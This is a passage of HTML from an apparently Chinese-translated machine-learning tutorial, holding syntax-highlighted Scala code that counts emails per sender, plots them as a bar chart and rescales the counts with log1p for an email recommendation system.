&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061366959184839-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061366959184839-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061366959184839-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061366959184839-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061366959184839-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061366959184839-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061366959184839-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061366959184839-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061366959184839-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061366959184839-32&quot;&gt;32&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061366959184839-1&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Add to the top body:&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061366959184839-2&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//添加到主体的顶部&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061366959184839-3&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061366959184839-4&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//First we group the emails by Sender, then we extract only the sender address &lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061366959184839-5&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//and amount of emails, and finally we sort them on amounts ascending&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061366959184839-6&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//首先我们按发送人给邮件分组，然后只抽取发送人的地址以及邮件数，&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061366959184839-7&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//最后按邮件数给这些地址按升序排序&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061366959184839-8&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mailsGroupedBySender&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;trainingData&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061366959184839-9&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;groupBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061366959184839-10&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061366959184839-11&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toArray&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061366959184839-12&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sortBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061366959184839-13&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061366959184839-14&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//In order to plot the data we split the values from the addresses as &lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061366959184839-15&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//this is how the plotting library accepts the data.&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061366959184839-16&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//为了将数据绘图，我们将数值与这些地址分离开，因为绘图库只接收这样的数据&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061366959184839-17&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;senderDescriptions&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mailsGroupedBySender&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061366959184839-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061366959184839-19&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061366959184839-20&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;senderValues&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mailsGroupedBySender&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061366959184839-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toDouble&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061366959184839-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061366959184839-23&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;barPlot&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;BarPlot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;plot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;senderValues&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;senderDescriptions&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061366959184839-24&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061366959184839-25&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Rotate the email addresses by -80 degrees such that we can read them&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061366959184839-26&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//将邮件地址旋转80度以方便阅读&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061366959184839-27&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;barPlot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getAxis&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;setRotation&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.3962634&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061366959184839-28&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;barPlot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;setAxisLabel&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061366959184839-29&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;barPlot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;setAxisLabel&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Amount of emails received &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061366959184839-30&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;peer&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;setContentPane&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;barPlot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061366959184839-31&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061366959184839-32&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;bounds&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Rectangle&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;800&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0038 seconds] --&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/effa38ba301a8939deb23a76033b9421.jpg&quot; width=&quot;600px&quot;&gt;&lt;/p&gt;
&lt;p&gt;这里可以看到，给你发送邮件最多的人发了45封，其后是37封，然后就迅速下降了。这些异常值的存在，会导致直接使用这些数据时，推荐系统仅将邮件发送最多的 1 到 2 位发送人列为重要级别，而剩下的则不考虑。为了防止出现这个问题，我们将通过 log1p 函数对数据进行重缩放。 log1p 函数是将数据加 1，然后再对其取对数 log。将数据加 1 的操作是考虑到发送人只发送一封邮件的情况。在对数据进行这样一个取对数操作之后，其图像是这样的。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d06136a923046405&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
//Code changes:
//代码更新
val mailsGroupedBySender = trainingData
    .groupBy(x =&amp;gt; x.sender)
    .map(x =&amp;gt; (x._1, Math.log1p(x._2.length)))
    .toArray
    .sortBy(x =&amp;gt; x._2)

barPlot.setAxisLabel(1, &quot;Amount of emails received on log Scale &quot;)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06136a923046405-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06136a923046405-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06136a923046405-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06136a923046405-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06136a923046405-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06136a923046405-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06136a923046405-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06136a923046405-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06136a923046405-9&quot;&gt;9&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06136a923046405-1&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Code changes:&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06136a923046405-2&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//代码更新&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06136a923046405-3&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mailsGroupedBySender&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;trainingData&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06136a923046405-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;groupBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06136a923046405-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;log1p&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06136a923046405-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toArray&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06136a923046405-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sortBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06136a923046405-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06136a923046405-9&quot;&gt;
